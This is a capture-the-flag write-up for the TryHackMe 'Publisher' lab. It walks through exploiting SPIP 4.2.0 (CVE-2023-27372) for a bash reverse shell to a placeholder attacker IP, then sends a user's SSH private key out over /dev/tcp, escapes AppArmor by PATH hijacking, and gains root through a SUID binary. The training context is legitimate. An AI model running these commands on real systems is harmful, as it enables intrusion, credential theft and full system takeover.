---
tags:
  - THM
  - Linux
  - Easy
  - RCE
  - Security-SW
  - File-Analysis
  - PATH-HJ
  - SUID
---
https://tryhackme.com/room/publisher/
# Add Hosts

Append to the `/etc/hosts` file:

```text
10.10.143.84 publisher.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC publisher.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
Found http://publisher.thm/spip/ directory:
```console
$ gobuster dir -q -u http://publisher.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

/images               (Status: 301) [Size: 315] [--> http://publisher.thm/images/]
/spip                 (Status: 301) [Size: 313] [--> http://publisher.thm/spip/]
```
Found vulnerable version (SPIP 4.2.0):
```console
$ whatweb http://publisher.thm/spip/

http://publisher.thm/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.143.84], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://publisher.thm/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache]
```
# Exploitation
Wait for reverse shell:
```bash
nc -lvnp <PORT>
```
Send the connection command via the `oubli` parameter with [CVE-2023-27372 exploit](https://www.exploit-db.com/exploits/51536):
```bash
python3 51536.py -u http://publisher.thm/spip -c 'bash -c "bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1"'
```
# Post-Exploitation
## User Migration
Wait for file reception in attacker's machine:
```bash
nc -lvnp <PORT> > id_rsa
```
Send private SSH key from **user think**:
```bash
cat /home/think/.ssh/id_rsa > /dev/tcp/<ATTACKER-IP>/<PORT>
```
Re-connect to the machine but now as **user think**:
```bash
ssh think@publisher.thm -i ./id_rsa
```
Get **user flag**:
```bash
cat /home/think/user.txt
```
## Escaping AppArmor
The current shell session does not allow access to many system locations like `/home` or `/tmp`, so we look at the currently running shell (`/usr/sbin/ash`):
```console
$ grep think /etc/passwd

think:x:1000:1000:,,,:/home/think:/usr/sbin/ash
```
Check if **AppArmor** is enabled:
```console
$ aa-enabled

Yes
```
Check **AppArmor** configuration for ash shell. We can still access `/dev/shm/*` and `/var/tmp/*` due to misconfiguration:
```console
$ cat /etc/apparmor.d/usr.sbin.ash

#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```
Move to unrestricted directory and found `/usr/sbin/run_container` with **SUID permissions**:
```console
$ cd /var/tmp

$ find / -perm -4000 2>/dev/null
/usr/sbin/run_container
```
The binary runs `/opt/run_container.sh` script and anyone should be able to edit it:
```console
$ strings /usr/sbin/run_container
/bin/bash
/opt/run_container.sh

$ ls -l /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
```
Can not edit the `/opt/run_container.sh` script due to **AppArmor** restrictions, but we can read it. It runs Docker insecurely (without full path).
`cat /opt/run_container.sh`:
```bash
#!/bin/bash

# Function to list Docker containers
list_containers() {
    if [ -z "$(docker ps -aq)" ]; then
	docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
    fi
    echo "List of Docker containers:"
    docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
    echo ""
}
```
Escape restricted ash shell using Docker **PATH Hijacking**:
```console
$ pwd
/var/tmp

$ echo "bash -p" > docker

$ chmod +x docker

$ export PATH=/var/tmp:$PATH

$ /opt/run_container.sh

$ $PATH
bash: /var/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
```
## Becoming Root
Modify the `/opt/run_container.sh` script and run the **SUID binary**:
```console
$ echo "bash -p" > /opt/run_container.sh

$ /usr/sbin/run_container

# whoami
root
```
Get the **root flag**:
```bash
cat /root/root.txt
```
# Notes
- **AppArmor** can also be tricked with [Shebang Bypass](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/apparmor.html#apparmor-shebang-bypass) as explained in [this write-up](https://faetu.github.io/posts/publisher/).